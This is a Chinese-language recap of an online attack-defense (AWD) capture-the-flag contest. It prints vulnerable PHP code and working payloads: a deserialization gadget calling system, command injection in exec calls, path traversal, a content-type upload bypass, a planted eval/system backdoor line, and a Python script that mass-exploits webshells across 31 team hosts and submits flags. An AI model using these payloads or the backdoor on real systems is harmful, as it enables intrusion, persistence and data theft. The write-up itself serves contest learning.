# “北极星杯”AWD线上赛复盘


<meta name="referrer" content="no-referrer" />

## 前言

10.3 [星盟安全](https://www.xmcve.com/)周年庆举办了一场线上AWD比赛

参赛队伍总计31支，见到了不少熟悉的ID

神仙大战果然被暴打hhhhhh，运气好还水了一个小奖品。

学到了不少东西，今天来写一下复盘总结。

## 比赛规则

- 每个队伍分配到一个docker主机，给定`web`(web)/`pwn`(pwn)用户权限，通过特定的端口和密码进行连接；
- 每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍。

- 选手需自行登录平台熟悉自助式初始化、api提交flag等功能。初始密码为队长所设密码，队长需在比赛开始前10分钟向主办方提交密码，过期未提交视为弃权。
- 选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮。选手需要保证己方服务的可用性，每次服务不可用，扣除10分；服务检测五分钟一轮；

- 不允许使用任何形式的DOS攻击，第一次发现扣1000分，第二次发现取消比赛资格。

比赛最终结果将在10月3日晚19:00-19:30于北极星杯网络安全交流群直播公布，同时会有技术分享及抽奖活动，敬请关注。

## 比赛开始

这次比赛3个web 2个pwn

首先就是老套路，打包源码跟数据库，然后D盾扫一扫。

因为队友的分工是权限维持，自己的分工主要是get flag，就直接看漏洞吧。

### WEB1

#### 预留后门

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438149-de7641eb-6ec5-4950-80f6-22394ff22bcb.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438243-c896fa2a-92df-4e51-b4b1-9be25aa78a98.png)

三个冰蝎一个普通一句话

难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？

第一时间写好了普通一句话的批量脚本

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438340-14520940-117b-4583-b255-4e9ea3b920b3.png)

改了改让他自动提交

当时大家可能都还没修，手速快就自动交了两轮

但是可以看到10队已经上了通防脚本，返回了一个假的flag

#### 反序列化

sqlhelper.php最下面有这样一句

```
if (isset($_POST['un']) && isset($_GET['x'])){
class A{
    public $name;
    public $male;
    
    function __destruct(){
        $a = $this->name;
        $a($this->male);
    }
}
unserialize($_POST['un']);
}
```

$name 传个system $male传个cat /flag 就可以拿到flag了

payload:

GET: `?x=yzddmr6`

POST: `un=O:1:"A":2:{s:4:"name";s:6:"system";s:4:"male";s:9:"cat /flag";};`

#### 注入上传

login.php

```
<?php
if (isset($_POST['username'])){
    include_once "../sqlhelper.php";
    $username=$_POST['username'];
    $password = md5($_POST['password']);
    $sql = "SELECT * FROM admin where name='$username' and password='$password';";
    $help = new sqlhelper();
    $res  = $help->execute_dql($sql);
    echo $sql;
    if ($res->num_rows){
        session_start();
        $row = $res->fetch_assoc();
        $_SESSION['username'] = $username;
        $_SESSION['id'] = $row['id'];
        $_SESSION['icon'] = $row['icon'];
        echo "<script>alert('登录成功');window.location.href='/'</script>";
    }else{
        echo "<script>alert('用户名密码错误')</script>";
    }
}
?>
```

可以看到直接把接收到了$username给带入到了sql语句中，产生注入

直接用万能密码就可以绕过

接着往下看登录之后可以做什么

info.php

```
if (isset($_FILES)) {
        if ($_FILES["file"]["error"] > 0) {
            echo "错误：" . $_FILES["file"]["error"] . "<br>";
        } else {
            $type = $_FILES["file"]["type"];
            if($type=="image/jpeg"){
                $name =$_FILES["file"]["name"] ;
                if (file_exists("upload/" . $_FILES["file"]["name"]))
                {
                    echo "<script>alert('文件已经存在');</script>";
                }
                else
                {
                    move_uploaded_file($_FILES["file"]["tmp_name"], "assets/images/avatars/" . $_FILES["file"]["name"]);
                    $helper = new sqlhelper();
                    $sql = "UPDATE  admin SET icon='$name' WHERE id=$_SESSION[id]";
                    $helper->execute_dml($sql);
                }
            }else{
                echo "<script>alert('不允许上传的类型');</script>";
            }
        }
}
```

可以看到他对文件类型的判断仅仅是`if($type=="image/jpeg")` 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在`assets/images/avatars/`目录下。

但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。

### WEB2

web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！

#### 预留后门

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438563-a19b026d-8071-4896-a729-efa073c1fa64.png)

pww.php跟pass.php都是冰蝎。。。

不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门

index.php里面就是一个普通的一句话

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438683-21ba4742-b20d-4a8b-924d-da5031206f02.png)

#### 命令注入

我们可以看到D盾还报了一个exec后门

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438813-af35f075-34d2-4f6b-aea1-9251f7cff0d3.png)

直接把$host双引号里带入

然后看一下$host是怎么来的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900438987-cbb07a7a-cc9e-479e-9b23-8e22c3771974.png)

然后看数据是如何放入数据库的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439120-7f43fb2b-efc3-48b9-b88d-043a5d0e3a61.png)

在收到`$_POST['host']`后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠

但是实际上在执行的`$r = exec("ping -c 1 $host");`这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。

因为exec是没有回显的，所以构造以下payload

```
||cat /flag > /ver/www/html/1.txt
```

把flag输出到网站根目录下

好像是需要登录，具体我也忘了

#### 任意文件读取

img.php

```
<?php
$file = $_GET['img'];
$img = file_get_contents('images/icon/'.$file);
//使用图片头输出浏览器
header("Content-Type: image/jpeg;text/html; charset=utf-8");
echo $img;
exit;
```

payload:`/img.php?img=../../../../../../../flag`

#### 反序列化

同web1，只不过不需要x参数了

### WEB3

能利用起来的好像就这一个洞，当时也没来得及看

#### 命令执行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439215-0edfba07-9f30-45c3-ac12-a1dd29f04336.png)

export.php

```
<?php
	if (isset($_POST['name'])){
	$name = $_POST['name'];
	exec("tar -cf backup/$name images/*.jpg");
	echo "<div class=\"alert alert-success\" role=\"alert\">
	导出成功,<a href='backup/$name'>点击下载</a></div>"}
?>
```

老套路，同web2

payload: `|| cat /flag > /var/www/html/1.txt ||`

## 艰难的权限维持

其实AWD比赛刚开始的时候，最重要的是维持权限而不是急着交flag。

当我还在审第一个web的时候，看到预留后门就问队友要不要给他框架弹个shell

结果他告诉我框架爆炸了。。。弹shell一直500。。。

缓缓打出三个问号。。。喵喵喵？？？

以前都是用团队的这个框架没问题，结果今天死活连不上。。。。

GG，这tm咋整啊，31个队手工维权玩个毛啊

所以就只能搞一些骚操作

### 循环批量GET FLAG

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439333-0272d70a-d48e-4ea0-8b0c-488bb973b2a0.png)

撸了一串脚本，来回跑，然后加上接口自动提交，没有框架只能这样了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439456-682bfefe-270a-40d5-9ca1-0712254e7bd3.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439603-42b2eb9f-f6f0-4dea-9dd1-5830ff17dd7a.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439714-005dffca-341a-4d39-90a8-3d255e10ecaf.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439834-e3382207-29ec-407d-9435-6131fcbf5403.png)

### 乌鸦坐飞机

对，没错，我们就是乌鸦，坐了别的队的飞机。

自己靶机的流量日志上发现了别的队伍的payload

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900439936-bb3225a0-15bd-4fd5-9bf3-a1a082d6f8a4.png)

写了个脚本看了下，几乎所有的队伍都被种上了这个师傅的马

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440032-57da490f-4ead-4963-a9f8-3cd719667f78.png)

不死马循环写入，被删后马上复活

你的马看起来不错，下一秒就是我的了。

白嫖了好几轮的flag

然后闲的没事想着不如连上蚁剑看看吧，找找其他师傅的马

批量导入一下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440174-f1798768-8bfe-42ae-966d-5fbfe89c617e.png)

看见其他队伍被种了马，满怀热泪的帮他们删了站。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440287-c16107a8-effa-43cb-af51-72fcfd3509bd.png)

有一个队伍被命令注入打惨了，也帮他们删个站吧。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440425-bc5ae48b-4370-4feb-aca7-36e4da956e64.png)

当然还看到不少其他队伍的马

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440553-797b4725-34b1-4f74-9d57-19ee20f30b56.png)

甚至还有批量上waf的py脚本

毕竟是其他队伍的内部脚本，象征性打个码

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440710-7ceffb43-b373-4d22-b7e4-042cc26645e5.png)

流量日志里还发现一个狼人队伍的循环感染不死马

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440822-30fb9c8b-efd0-4a64-b988-547758fdfcbe.png)

会遍历目录把所有的php文件头部加上后门

```
<?php if (md5($_REQUEST['pass'])==="8e68ca4946b8e146a408f727eaf9da7c"){@eval($_REQUEST['code']);@system($_REQUEST['sys']);} ?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900440972-5686ebd9-3ea3-4c98-b9b8-2e5c89306a7a.png)

不过惊讶的是他的md5居然可以解开

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900441090-f1bbb6c3-68dd-4809-9e80-40442e007e5d.png)

somd5牛逼！

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900441201-d9ce9f33-aa80-4355-bed1-5e110a5ee901.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900441306-127af701-b56b-4978-a81f-e022fa11ae97.png)

好马，下一秒就是我的了

批量脚本走起

```
import requests
import json
url="http://39.100.119.37:{0}{1}80/login/index.php?pass=Happy.Every.Day&code=system('cat /flag');"
def submit(flag):
    hosturl="http://39.100.119.37:10000/commit/flag"
    data={'flag':flag,"token":"xxxxx"}
    data=json.dumps(data)
    r=requests.post(hosturl,data=data,headers={"Cookie":"PHPSESSID=xxxxx","Content-Type":"application/json; charset=UTF-8"})
    print(r.text)
for j in range(1,4):
    for i in range(1,32):
        i=str(i).zfill(2)
        url1=url.format(j,i)
        print(url1)
        try:
            res=requests.get(url=url1)
            if 'flag' in res.text:
                submit(res.text[0:38])
                print(res.text[0:38])
        except:
            pass
```

## 尾声

最后web基本上都修了，payload已经打不动了

只能靠不死马来get flag

因为开始手快，得分比较多，还有负责修的队友比较给力，掉分不是很多。

然而毕竟是白嫖别人的马，所以增长分数的速度越来越慢

最后还往后掉了一名，不过还拿个小奖hhhhh

## 总结

师傅们一个个都心狠手辣，但是说到最后还是自己有很多没有考虑到的地方。

因为框架主要是需要先弹个shell到自己的服务器，然后才能自动维权，get flag等一系列操作

但是开始框架崩了后直接懵了，不知道怎么办

其实现在想自己完全可以当时重写一个批量种不死马的脚本来维权

但是当时31个队伍，三个一堆洞的web，难免有些手忙脚乱。

有些队伍的通防很厉害，匹配到关键字直接返回一个假的flag，自己准备也写一个。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900441415-0e783513-baab-44dd-8b33-f36d713c0076.png)

怀疑他们用的都是一家的脚本。。。。返回的flag都一样

## 最后

AWD一般都是线下赛，线上AWD见得还不多。

星盟的这个线上赛体验还是很不错的，能够撑住31个队伍，每个队伍5个题也是挺厉害的

中途虽然平台有宕机但是很快就恢复了。

给星盟点个赞，希望星盟以后越做越好~
